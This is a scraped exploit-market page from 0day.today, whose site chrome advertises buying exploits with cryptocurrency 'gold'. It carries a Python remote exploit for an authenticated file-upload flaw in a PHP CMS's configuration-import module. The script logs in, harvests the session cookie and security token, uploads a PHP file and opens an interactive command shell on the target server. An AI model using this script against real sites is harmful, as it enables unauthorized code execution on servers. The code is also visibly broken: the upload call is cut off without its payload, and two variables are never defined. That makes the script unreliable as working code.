			<meta name='description' content=""> 
			<meta name='keywords' content=""> 
		
		<link rel='stylesheet' href='/style?1591980953' type='text/css' media='all' />
		<link rel='stylesheet' href='/skin/green?1591980953' type='text/css' media='all' />
		<link rel='stylesheet' href='/qtip_style' type='text/css' media='all' />
		<link rel='stylesheet' href='/fancybox_style' >
		<script type='text/javascript' src='/jquery'></script>
		<script type='text/javascript' src='/qtip_js'></script>
		<script type='text/javascript' src='/upl1'></script>
		<script type='text/javascript' src='/upl2'></script>
		<script type='text/javascript' src='/fancybox'></script>
		<script src='/chart_js'></script>
		<script type='text/javascript'>
			$(document).ready(function() {
				$('.popup').fancybox({
					fitToView	: true,
					autoSize	: true,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
				$('.popup_modal').fancybox({
					modal	: true, 
					width   : '100%',
					height  : '100%',
					fitToView	: true,
					autoSize	: false,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
			});
		</script>
		<script type='text/javascript'>
			  var _gaq = _gaq || [];
			  _gaq.push(['_setAccount', 'UA-23466659-1']);
			  _gaq.push(['_trackPageview']);
			  (function() {
				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
			  })();
		</script>
	</head>
	<body  onload='onloadpage()' ><div class='menu' style='text-align:center; width:1200px;'>[ <a href='/'>home</a> ]&nbsp;&nbsp;[ <a href='/private' class=''>private</a> ]&nbsp;&nbsp;[ <a href='/0day' class='RedText'>0Day</a> ]&nbsp;&nbsp;[ <a href='/discount'>discount</a> ]&nbsp;&nbsp;[ <a href='/gold' class='YellowTextGold'> Get Gold </a> ]&nbsp;&nbsp;[ <a href='/platforms'>platforms</a> ]&nbsp;&nbsp;[ <a href='/pentest'>pentest</a> ]&nbsp;&nbsp;[ <a href='/hash'>hash</a> ]&nbsp;&nbsp;[ <a href='/search'>search</a> ]&nbsp;&nbsp;[ <a href='/faq' class='RedText'>faq</a> ]&nbsp;&nbsp;[ <a href='/contacts'>contact</a> ]&nbsp;&nbsp;[ <a href='/style/change' alt=''>style</a> ]&nbsp;&nbsp;[ <a href='/btc/change' class='YellowTextBtc'>Prices in Gold</a> ]&nbsp;&nbsp;&nbsp;<span class='YellowText'>db:</span> <span class='RedText'>34 387</span>&nbsp;&nbsp;&nbsp;&nbsp;<div class='menu_icon'><a title='0day Today Exploit DB Official Facebook' href='http://www.facebook.com/Inj3ct0rs' target='_Blank'><img src='/img/fb.png' alt='0day Today Exploit DB Official Facebook'></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official Twitter ' href='http://twitter.com/Inj3ct0r' target='_Blank'><img src='/img/tw.png' alt='0day Today Exploit DB Official Twitter '></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official RSS Channel' href='/rss' target='_Blank'><img src='/img/rss.png' alt='0day Today Exploit DB Official RSS Channel'></a></div> <div class='menu_icon'><a title='Tor Network' href='http://mvfjfugdwgc5uwho.onion' target='_Blank'><img src='/img/tor3.png' alt='Tor'></a></div> </div><div class='content'>
				<div class='popup_welcome ' id='popup_welcome_div'>
					<a href='#popup_welcome_div' class='popup' id='popup_welcome'>&nbsp;</a>
					<div class='pop_up_welcome_title'>
						<strong><span class='RedText'>0day.today - Biggest Exploit Database in the World.</span></strong>
						<div style='float:right; margin-top:-5px; heigth:24px; line-height:16px; '>
							<div style='float:left; margin-top:3px;'>Select your language: &nbsp;</div>
							<a class='' href='http://en.0day.today/exploit/21456'>
								<img src='/img/langs/en.png' alt='English'>
								<div class='TipText'>
									English
								</div>
							</a><a class='' href='http://ru.0day.today/exploit/21456'>
								<img src='/img/langs/ru.png' alt='Русский'>
								<div class='TipText'>
									Русский
								</div>
							</a><a class='' href='http://de.0day.today/exploit/21456'>
								<img src='/img/langs/de.png' alt='Deutsch'>
								<div class='TipText'>
									Deutsch
								</div>
							</a><a class='' href='http://tr.0day.today/exploit/21456'>
								<img src='/img/langs/tr.png' alt='Türkçe'>
								<div class='TipText'>
									Türkçe
								</div>
							</a><a class='' href='http://fr.0day.today/exploit/21456'>
								<img src='/img/langs/fr.png' alt='Français'>
								<div class='TipText'>
									Français
								</div>
							</a><a class='' href='http://it.0day.today/exploit/21456'>
								<img src='/img/langs/it.png' alt='Italiano'>
								<div class='TipText'>
									Italiano
								</div>
							</a><a class='' href='http://es.0day.today/exploit/21456'>
								<img src='/img/langs/es.png' alt='Español'>
								<div class='TipText'>
									Español
								</div>
							</a><a class='' href='http://ro.0day.today/exploit/21456'>
								<img src='/img/langs/ro.png' alt='Romania'>
								<div class='TipText'>
									Romania
								</div>
							</a><a class='' href='http://pl.0day.today/exploit/21456'>
								<img src='/img/langs/pl.png' alt='Polskie'>
								<div class='TipText'>
									Polskie
								</div>
							</a><a class='' href='http://ar.0day.today/exploit/21456'>
								<img src='/img/langs/ar.png' alt='العربية'>
								<div class='TipText'>
									العربية
								</div>
							</a><a class='' href='http://jp.0day.today/exploit/21456'>
								<img src='/img/langs/jp.png' alt='Japan'>
								<div class='TipText'>
									Japan
								</div>
							</a><a class='' href='http://cn.0day.today/exploit/21456'>
								<img src='/img/langs/cn.png' alt='China'>
								<div class='TipText'>
									China
								</div>
							</a>
						</div>
					</div>
					
					<div style='float:left; background:#000; width:480px; border-right:1px solid #004000; text-align:justify; margin:10px 0px 0px 0px; padding:0px 15px 0px 0px;'>
						<div class='centertext'><img src='/img/logo_green.jpg' style='width:400px;'></div>
						<div class='spacer'></div>
						Things you should know about 0day.today: 
						<ul>
						<li>We use one main domain: <a href='http://0day.today'>http://0day.today</a></li>
						<li>Most of the materials is <span class='YellowText'>completely FREE</span></li>
						<li>If you want to <span class='RedText'>purchase the exploit</span> / <span class='RedText'>get V.I.P. access</span>  or pay for any other service, <br>you need to buy or earn <img src='/img/gold.gif'> <span class='GoldText'>GOLD</span></li>
					</ul>
						
						<div class='spacer'></div>
						<div class='center'>
							We accept currencies: [<a href='/contacts' target=_blank>contact admin to find more</a>]
							<div class='half_spacer'></div>
							<a href='/gold'><img src='/img/bitcoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/litecoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/ethereum.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							
						</div>
						<div class='spacer'></div>
						<div class='spacer'></div>
						We don't want you to use our site as a tool for hacking purposes, so any kind of action that could 
			affect illegaly other users or websites that you don't have right to access will be banned 
			and your account including your data will be destroyed.<br><br>
			Administration of this site uses the <a href='/contacts' target=_blank>official contacts</a>. Beware of impostors!
						<div class='spacer'></div>
						<div class='spacer'></div>
						<div class='centertext'><a href='/popup/off' class='RedText'>I am registered user of 0day.today. I don't want to see this screen in future.</a></div>
						
					</div>
					<div style='float:left; background:#000; width:300px; padding:10px 0px;'>
						<center><strong><span class='RedText'>What to do first?</span></strong></center>
						<ol style='margin-left:25px;'>
							<li>Read the [ <a href='/law' target='_blank'>agreement</a> ]</li>
							<li>Read the [ <a href='/faq/how_publish' target='_blank'>Submit</a> ] rules</li>
							<li>Visit the [ <a href='/faq' target='_blank'>faq</a> ] page</li>
							<li>[ <a href='/reg' target='_blank'>Register</a> ] profile</li>
							<li>Get [ <a href='/gold' target='_blank'>GOLD</a> ]</li>
							<li>If you want to [ <a href='/faq/sell' target='_blank'>sell</a> ]</li>
							<li>If you want to [ <a href='/faq/buy' target='_blank'>buy</a> ]</li>
							<li>If you lost [ <a href='restore' target='_blank'>Account</a> ]</li>
							<li>Any questions [ <a href='mailto:admin@0day.today'>admin@0day.today</a> ]</li>
						</ol>
						<br>
						<br>
						
						<center><strong><span class='RedText'>Main links</span></strong></center>
						<ul style='margin-left:25px;'>
							<li><a href='/auth'>Authorisation page</a></li>
							<li><a href='/reg'>Registration page</a></li>
							<li><a href='/restore'>Restore account page</a></li>
							<li><a href='/faq'>FAQ page</a></li>
							<li><a href='/contacts'>Contacts page</a></li>
							<li><a href='/faq#submit'>Publishing rules</a></li>
							<li><a href='/law'>Agreement page</a></li>
						</ul>
						<br>
						<br>
						
						<center><strong><span class='RedText'>You can contact us by</span></strong></center><br>
						<div class='popup_contacts_items popup_contacts_mail'>
							<div class='popup_contacts_items_title '>Mail:</div> 
							<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
						</div>
						<!--<div class='popup_contacts_items popup_contacts_jabber'>
							<div class='popup_contacts_items_title '>Jabber:</span></strong></div> 
							<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
						</div>
						<div class='popup_contacts_items popup_contacts_skype'>
							<div class='popup_contacts_items_title '>Skype:</span></strong></div> 
							<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
						</div>
						-->
						<div class='popup_contacts_items popup_contacts_fb'>
							<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
						</div>
						<div class='popup_contacts_items popup_contacts_twitter'>
							<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
						</div>
					</div>
				</div>
		<div class='head_auth'>
				<div class='menu_icon'><img src='/img/lock.png'></a></div> 
				[ <a href='/auth' class='RedText'>authorization</a> ] 
				[ <a href='/reg' class='RedText'>registration</a> ] 
				[ <a href='/restore' class='RedText'>restore account</a> ] 
			</div>
			<div class='head_contacts '>
				<a href='#contacts_popup' class='popup'>
				<img src='/img/mail3.png'>
				Contact us
				<!--<img src='/img/skype.png'>
				<img src='/img/jabber.png'>-->
				
				</a>
			</div>
			<div id='contacts_popup'>
				<div class='category_text strong'><span class='RedText'>You can contact us by:</span> </div>
				<div class='spacer'></div>
				<div class='popup_contacts_page'>
					<div class='popup_contacts_items popup_contacts_mail'>
						<div class='popup_contacts_items_title '>Mail:</div> 
						<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
					</div>
					
					<!--<div class='popup_contacts_items popup_contacts_jabber'>
						<div class='popup_contacts_items_title YellowText'>Jabber:</span></strong></div> 
						<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
					</div>
					<div class='popup_contacts_items popup_contacts_skype'>
						<div class='popup_contacts_items_title YellowText'>Skype:</span></strong></div> 
						<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
					</div>-->
					
					<div class='popup_contacts_items popup_contacts_fb'>
						<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
					</div>
					<div class='popup_contacts_items popup_contacts_twitter'>
						<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
					</div>
				</div>
			</div>
			
			
				<div class='head'>
					<div class='double_spacer'></div>
					<div class='double_spacer'></div><a href='/'><img src='/img/logo_green.jpg' alt='0day Today Exploits Market and 0day Exploits Database'></a>
					
					
				</div>
						
				
					<style>
					.fancybox-inner {
						background:#000000 url(/img/bg.gif);
					}
					.content{border:1px solid #008000; }
					</style>
					
						
						<script type='text/javascript' src='/hightlight_lib'></script>
						<script type='text/javascript' src='/hightlight/python'></script>
						
						<link type='text/css' rel='stylesheet' href='/hightlight_style?1591980954'/>
						<script type='text/javascript'>SyntaxHighlighter.all();</script>
						
						
						
						
							<div style='font-size:11px; font-weight:bold;'>
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Author</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/author/706' target=_blank>LiquidWorm</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Risk</div>
									<div style='float:left; width:190px; margin:5px 0px 0px 0px;' ><img src='/img/risk/critlow_4.gif'> [<span style='font-size:9px;'><div class='tips_risk_color_4'>Security Risk Critical</div></span>]</div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>0day-ID</div>
									<div style='float:left; margin:5px 0px 0px 0px;' ><a href='/exploit/description/21456' target=_blank>0day-ID-21456</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Category</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/remote'>remote exploits</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Date add</div>
									<div style='float:left; width:190px;margin:5px 0px 0px 0px;' ><a href='/date/04-11-2013'>04-11-2013</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Platform</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/platforms/php'>php</a></div>
									
									
								<div class='clear'></div>
									
							</div>
#
#
#
#
# Affected version: 3.6, 3.5 and 3.1
#
# revolutionary drag & drop interface.
#
# Desc: The vulnerability is caused due to the improper verification of uploaded
# files in &#039;/ip_cms/modules/developer/config_exp_imp/manager.php&#039; script thru the
# &#039;manage()&#039; function (@line 65) when importing a configuration file. This can be
# exploited to execute arbitrary PHP code by uploading a malicious PHP script file
# that will be stored in &#039;/file/tmp&#039; directory after successful injection.
# Permission Developer[Modules exp/imp] is required (parameter &#039;i_n_2[361]&#039; = on)
# for successful exploitation.
#
# Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
#            GNU/Linux CentOS 6.3 (Final)
#            Apache 2.4.2 (Win32) / Apache2
#            PHP 5.4.7 / PHP 5.3.21
#            MySQL 5.5.25a
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#
# Zero Science Lab - http://www.zeroscience.mk
# Macedonian Information Security Research And Development Laboratory
#
#
# Advisory ID: ZSL-2013-5159
# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2013-5159.php
#
#
#
# 12.10.2013
#
 
ver = &#039;1.0.0.000251&#039;
 
import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re
 
from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError
 
init()
 
if os.name == &#039;posix&#039;: os.system(&#039;clear&#039;)
if os.name == &#039;nt&#039;: os.system(&#039;cls&#039;)
piton = os.path.basename(sys.argv[0])
 
def bannerche():
    print """
 @---------------------------------------------------------------@
 |                                                               |
 |                                                               |
 |                                                               |
 |                       ID: ZSL-2013-5159                       |
 |                                                               |
 |              Copyleft (c) 2013, Zero Science Lab              |
 |                                                               |
 @---------------------------------------------------------------@
          """
    if len(sys.argv) < 3:
        print &#039;\n\x20\x20[*] &#039;+Fore.YELLOW+&#039;Usage: &#039;+Fore.RESET+piton+&#039; <hostname> <path>\n&#039;
        sys.exit()
 
bannerche()
 
print &#039;\n\x20\x20[*] Initialising exploit &#039;+&#039;.&#039;*34+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
host = sys.argv[1]
path = sys.argv[2]
 
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 
try:
    opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/admin.php&#039;)
except urllib2.HTTPError, errorzio:
    if errorzio.code == 404:
        print &#039;\x20\x20[*] Checking path &#039;+&#039;.&#039;*41+Fore.RED+&#039;[ER]&#039;+Fore.RESET
        print &#039;\x20\x20[*] &#039;+Fore.YELLOW+&#039;Check your path entry.&#039;+Fore.RESET
        sys.exit()
except URLError, errorziocvaj:
    if errorziocvaj.reason:
        print &#039;\x20\x20[*] Checking host &#039;+&#039;.&#039;*41+Fore.RED+&#039;[ER]&#039;+Fore.RESET
        print &#039;\x20\x20[*] &#039;+Fore.YELLOW+&#039;Check your hostname entry.&#039;+Fore.RESET
        sys.exit()
 
print &#039;\x20\x20[*] Checking host and path &#039;+&#039;.&#039;*32+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
token_chk = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/admin.php&#039;)
response = token_chk.read()
match = re.search(&#039;(?<=security_token=)\w+&#039;, response)
sectoken = match.group(0)
 
print &#039;\x20\x20[*] Login please.&#039;
username = raw_input(&#039;\x20\x20[*] Enter username: &#039;)
password = raw_input(&#039;\x20\x20[*] Enter password: &#039;)
 
login_data = urllib.urlencode({
                            &#039;f_name&#039; : username,
                            &#039;f_pass&#039; : password,
                            &#039;action&#039; : &#039;login&#039;
                            })
 
login = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/admin.php?action=login&security_token=&#039;+sectoken, login_data)
auth = login.read()
for session in cj:
    sessid = session.name
 
ses_chk = re.search(r&#039;%s=\w+&#039; % sessid , str(cj))
cookie = ses_chk.group(0)
 
print &#039;\x20\x20[*] Mapping Session ID &#039;+&#039;.&#039;*36+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] Cookie: &#039;+Fore.YELLOW+cookie+Fore.RESET+&#039;\x20&#039;+&#039;.&#039;*(46 - len(cookie))+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] Mapping security token &#039;+&#039;.&#039;*32+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] Token: &#039;+Fore.YELLOW+sectoken+Fore.RESET+&#039;\x20&#039;+&#039;.&#039;*15+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
if re.search(r&#039;Incorrect name or password&#039;, auth):
    print &#039;\x20\x20[*] Faulty credentials given &#039;+&#039;.&#039;*30+Fore.RED+&#039;[ER]&#039;+Fore.RESET
    sys.exit()
elif re.search(r&#039;Your login suspended for one hour&#039;, auth):
    print &#039;\x20\x20[*] Your username is suspended for 1 hour &#039;+&#039;.&#039;*17+Fore.RED+&#039;[ER]&#039;+Fore.RESET
    sys.exit()
else:
    print &#039;\x20\x20[*] Authenticated &#039;+&#039;.&#039;*41+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
    print &#039;\x20\x20[*] Sending payload &#039;+&#039;.&#039;*39+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
class MultiPartForm(object):
 
    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
     
    def get_content_type(self):
        return &#039;multipart/form-data; boundary=%s&#039; % self.boundary
 
    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return
 
    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or &#039;application/octet-stream&#039;
        self.files.append((fieldname, filename, mimetype, body))
        return
     
    def __str__(self):
 
        parts = []
        part_boundary = &#039;--&#039; + self.boundary
         
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: form-data; name="%s"&#039; % name,
              &#039;&#039;,
              value,
            ]
            for name, value in self.form_fields
            )
         
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: file; name="%s"; filename="%s"&#039; % \
                 (field_name, filename),
              &#039;Content-Type: %s&#039; % content_type,
              &#039;&#039;,
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
         
        flattened = list(itertools.chain(*parts))
        flattened.append(&#039;--&#039; + self.boundary + &#039;--&#039;)
        flattened.append(&#039;&#039;)
        return &#039;\r\n&#039;.join(flattened)
 
if __name__ == &#039;__main__&#039;:
 
    form = MultiPartForm()
    form.add_field(&#039;spec_security_code&#039;, &#039;12345678901234567890123456789012&#039;)
    form.add_field(&#039;spec_rand_name&#039;, &#039;lib_php_form_standard_1_&#039;)
     
    form.add_file(&#039;config&#039;, &#039;liwo.php&#039;,
 
    request = urllib2.Request(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/admin.php?module_id=361&action=import&security_token=&#039;+sectoken)
    request.add_header(&#039;User-agent&#039;, &#039;joxypoxy 1.0&#039;)
    body = str(form)
    request.add_header(&#039;Content-type&#039;, form.get_content_type())
    request.add_header(&#039;Cookie&#039;, cookie)
    request.add_header(&#039;Content-length&#039;, len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()
 
print &#039;\x20\x20[*] Starting logging service &#039;+&#039;.&#039;*30+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] Spawning shell &#039;+&#039;.&#039;*40+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
time.sleep(1)
furl = &#039;/admin.php?module_id=361&action=import_uploaded&security_token=&#039;
 
def osys():
    cmd = &#039;uname&#039;
    execute = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+furl+sectoken+&#039;&cmd=&#039;+urllib.quote(cmd))
    reverse = execute.read()
    if re.search(r&#039;Linux&#039;, reverse, re.IGNORECASE):
        cmd = &#039;pwd&#039;
        print Style.DIM+Fore.WHITE
        print &#039;\n\x20\x20[*] Coins: 1&#039;
        print &#039;\x20\x20[*] Detected platform: Linux&#039;
        print &#039;\x20\x20[*] Type \&#039;exit\&#039; to leave&#039;
        print &#039;\x20\x20[*] Choose your CMDs wisely&#039;
        print &#039;\x20\x20[*] Your current location:&#039;
        print Style.RESET_ALL+Fore.RESET
        return cmd
    else:
        cmd = &#039;cd&#039;
        print Style.DIM+Fore.WHITE
        print &#039;\n\x20\x20[*] Coins: 1&#039;
        print &#039;\x20\x20[*] Detected platform: Windows&#039;
        print &#039;\x20\x20[*] Type \&#039;exit\&#039; to leave&#039;
        print &#039;\x20\x20[*] Choose your CMDs wisely&#039;
        print &#039;\x20\x20[*] Your current location:&#039;
        print Style.RESET_ALL+Fore.RESET
        return cmd
 
print
 
today = datetime.date.today()
logging.basicConfig(filename=fname,level=logging.DEBUG)
 
logging.info(&#039; &#039;+&#039;+&#039;*75)
logging.info(&#039; +&#039;)
logging.info(&#039; + Log generated on: &#039;+today.strftime(&#039;%A, %d-%b-%Y&#039;)+time.strftime(&#039;, %H:%M:%S&#039;))
logging.info(&#039; + Python program executed: &#039;+sys.argv[0])
logging.info(&#039; + Version: &#039;+ver)
logging.info(&#039; + Full query: \&#039;&#039;+piton+&#039;\x20&#039;+host+&#039;\x20&#039;+path+&#039;\&#039;&#039;)
logging.info(&#039; + Username input: &#039;+username)
logging.info(&#039; + Password input: &#039;+password)
logging.info(&#039; + Vector: &#039;+&#039;http://&#039;+host+&#039;/&#039;+path+furl+sectoken)
logging.info(&#039; +&#039;)
logging.info(&#039; + Advisory ID: ZSL-2013-5159&#039;)
logging.info(&#039; + Zero Science Lab - http://www.zeroscience.mk&#039;)
logging.info(&#039; +&#039;)
logging.info(&#039; &#039;+&#039;+&#039;*75+&#039;\n&#039;)
 
print Style.DIM+Fore.CYAN+&#039;\x20\x20[*] Press [ ENTER ] to INSERT COIN!\n&#039;+Style.RESET_ALL+Fore.RESET
while True:
    try:
        cmd = raw_input(Fore.RED+&#039;shell@&#039;+host+&#039;:~# &#039;+Fore.RESET)
        if cmd.strip() == &#039;&#039;:
            cmd = osys()
 
        execute = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+furl+sectoken+&#039;&cmd=&#039;+urllib.quote(cmd))
        reverse = execute.read()
 
        print Style.BRIGHT+Fore.CYAN
        cmdout = pattern.match(reverse)
        print cmdout.groups()[0].strip()
        print Style.RESET_ALL+Fore.RESET
 
        if cmd.strip() == &#039;exit&#039;:
            break
 
        logging.info(&#039;Command executed: &#039;+cmd+&#039;\n\nOutput: \n&#039;+&#039;=&#039;*8+&#039;\n\n&#039;+cmdout.groups()[0].strip()+&#039;\n\n&#039;+&#039;-&#039;*60+&#039;\n&#039;)
    except Exception:
        break
 
logging.warning(&#039;\n\n END OF LOG&#039;)
print &#039;\x20\x20[*] Carpe commentarius &#039;+&#039;.&#039;*36+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] File &#039;+Fore.YELLOW+fname+Fore.RESET+&#039;\x20&#039;+&#039;.&#039;*19+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
sys.exit()

